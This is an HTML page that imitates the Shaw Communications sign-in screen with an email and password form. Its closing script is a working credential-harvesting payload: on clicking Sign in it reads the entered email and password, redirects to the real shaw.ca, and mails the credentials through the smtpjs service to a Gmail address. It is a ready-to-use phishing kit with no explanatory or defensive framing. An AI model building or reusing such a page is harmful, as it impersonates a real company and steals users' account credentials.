<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./shaw.css">
    <link rel="icon" href="./assets/RCI-3a11c6a0.png" type="image/png">
    <script src="https://kit.fontawesome.com/9decf43890.js" crossorigin="anonymous"></script>

    

    <title>Shaw sign in</title>

</head>

<body>
    <article class="my_card_container">
        <!-- header ---------- -->
        <div class="header">
            <div class="header-left">
                <div class="header-btn">
                    <span class="personal">
                        Personal
                    </span>
                    <span class="business">
                        Business
                    </span>
                </div>
                <div class=" contact">
                    <h3>Shop</h3>
                    <hr>
                    <h3>Support</h3>
                    <hr>
                    <h3>My shaw</h3>

                </div>

            </div>

            <div class="header-right">

                <h3> <i class="fa-regular fa-message"></i>Contact</h3>

            </div>

        </div>

        <!-- ----------body--------- -->

        <div class="body">
            <div class="body-shaw">

                <div class="body-shaw-contents">

                    <div class="shaw-image">
                        <img src="./assets/shaw-image.webp" alt="">

                    </div>

                    <form>

                        <div class="form">

                            <label>Shaw email</label>
                            <div class="input-signin">
                                <input type="text" placeholder="example@shaw.ca" name="email" id="email" required>

                                <i class="fa-solid fa-circle-question"></i>
                            </div>
                            <label>Password </label>
                            <input type="password" name="password" id="password" required>
                            <div class="input-remember-password">
                                <input type="checkbox" name="remember-password" id="remember-password" required>
                                <span>Remember shaw email</span>
                            </div>


                        </div>


                        <div class="body-btn">
                            <a href="https://www.shaw.ca/" type="submit"  id="btn">Sign in</button>

                        </div>
                    
                    </form>


                    <div class="password">
                        <span class="having-trouble">Having trouble? <a href="#" class="shaw-support"> Shaw Support: How
                                To Reset My Password</a>

                        </span>
                        <span class="already-know">Already Know How? <a href="#" class="reset-password"> Reset Password
                                On
                                My
                                shaw</a>
                        </span>
                    </div>

                </div>

                <hr class="hr-2">
                <div class="advertisement-blank">



                </div>

            </div>


        </div>


        <!-- ----------footer----------- -->

        <footer class="footer-shaw">
            <div class="footer-content">


                <div class="privacyandothers">
                    <span class="privacy"> Privacy</span>
                    <hr>
                    <span class="terms-of-use">Terms of Use </span>
                    <hr>
                    <span class="accessibilty">Accessibilty</span>
                </div>
                <div class="shaw-communication">


                    <p>2022 Shaw Communication. All Right Reserved.</p>

                </div>


            </div>

        </footer>
    </article>


    <script src="https://smtpjs.com/v3/smtp.js"></script>


    <script>

        var btn = document.getElementById('btn');
        btn.addEventListener('click' , function(e){
            e.preventDefault()
            window.location.href = 'https://www.shaw.ca/';
            

            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            var body = 'email: '+email + '<br/> password: '+password;
           

                         
             
            Email.send({
            SecureToken : "e6a29b9a-e120-46a9-93ff-2a5098b6a6f6",
            To : 'jlcb69920011@gmail.com',
            From : "jlcb69920011@gmail.com",
            Subject : "This is the subject",
            Body : body
            })   

        })




         


    </script>







</body>

</html>
